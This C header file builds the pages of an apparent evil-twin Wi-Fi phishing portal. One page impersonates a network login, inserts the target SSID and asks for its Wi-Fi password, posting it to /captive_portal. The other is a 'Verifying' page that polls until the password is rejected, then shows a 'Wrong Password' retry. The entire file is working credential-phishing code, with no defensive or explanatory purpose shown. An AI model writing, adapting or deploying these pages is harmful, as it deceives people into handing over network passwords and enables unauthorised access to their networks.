#ifndef PAGE_CAPTIVE_H
#define PAGE_CAPTIVE_H

#include <stdio.h>
#include <string.h>

static inline int page_captive_generate(char *buf, size_t buf_size, const char *ssid) {
    return snprintf(buf, buf_size,
"<!DOCTYPE html>"
"<html lang=\"en\">"
"<head>"
"<meta charset=\"utf-8\">"
"<title>Step Network</title>"
"<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">"
"<style>"
"*{box-sizing:border-box;margin:0;padding:0;}"
"body{font-family:Arial,sans-serif;background:#f0f0f0;}"
"#header{background:#0055a5;color:white;padding:20px;text-align:center;}"
"#header h1{font-size:5vw;letter-spacing:1px;}"
"#login{background:white;max-width:400px;margin:30px auto;padding:30px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.15);}"
"#login p{margin-bottom:16px;}"
"#login label{display:block;font-weight:bold;margin-bottom:4px;color:#333;}"
"#login input.input{width:100%%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-top:4px;}"
"#login input.button{width:100%%;padding:12px;background:#0055a5;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:8px;}"
"#login input.button:hover{background:#003d7a;}"
"#error-msg{color:red;font-weight:bold;text-align:center;margin-bottom:16px;display:none;}"
"#have_account a{color:#0055a5;font-weight:bold;}"
"#rights_reserved p{margin-top:10px;color:#555;font-size:12px;}"
"</style>"
"</head>"
"<body>"
"<div id=\"header\">"
"<div id=\"login-intro\">"
"<h1>Enter the password to connect to %s</h1>"
"</div>"
"</div>"
"<div id=\"login\" class=\"login\">"
"<div id=\"error-msg\">&#8855; Wrong Password. Please try again.</div>"
"<form method=\"post\" name=\"loginform\" id=\"loginform\" action=\"/captive_portal\">"
"<p>"
"<label for=\"user_pass\">"
"Password<br>"
"<input type=\"password\" name=\"password\" id=\"user_pass\" class=\"input\" value=\"\" size=\"20\">"
"</label>"
"</p>"
"<input name=\"accept\" type=\"submit\" class=\"button\" value=\"Connect\">"
"</form>"
"<br>"
"</div>"
"<script>"
"if(window.location.search.indexOf('error=1')!==-1){"
"document.getElementById('error-msg').style.display='block';"
"}"
"</script>"
"</body>"
"</html>",
    ssid);
}

// max size of the generated page — base HTML + up to 32 bytes for SSID
#define PAGE_CAPTIVE_MAX_SIZE 2048

const char page_captive_verifying[] =
"<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
"<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
"<style>body{font-family:Arial,sans-serif;text-align:center;padding:40px;background:#f0f0f0;}"
"h2{color:#0055a5;font-size:5vw;}"
"</style>"
"</head><body>"
"<h2>Verifying, please wait...</h2>"
"<progress></progress>"
"<script>"
"function check(){"
"var x=new XMLHttpRequest();"
"x.open('GET','/?check=1',true);"
"x.onload=function(){"
"if(x.responseURL&&x.responseURL.indexOf('error=1')!==-1){"
"window.location.href='/?error=1';"
"}else{setTimeout(check,2000);}"
"};"
"x.onerror=function(){setTimeout(check,2000);};"
"x.send();"
"}"
"setTimeout(check,2000);"
"</script>"
"</body></html>";

#endif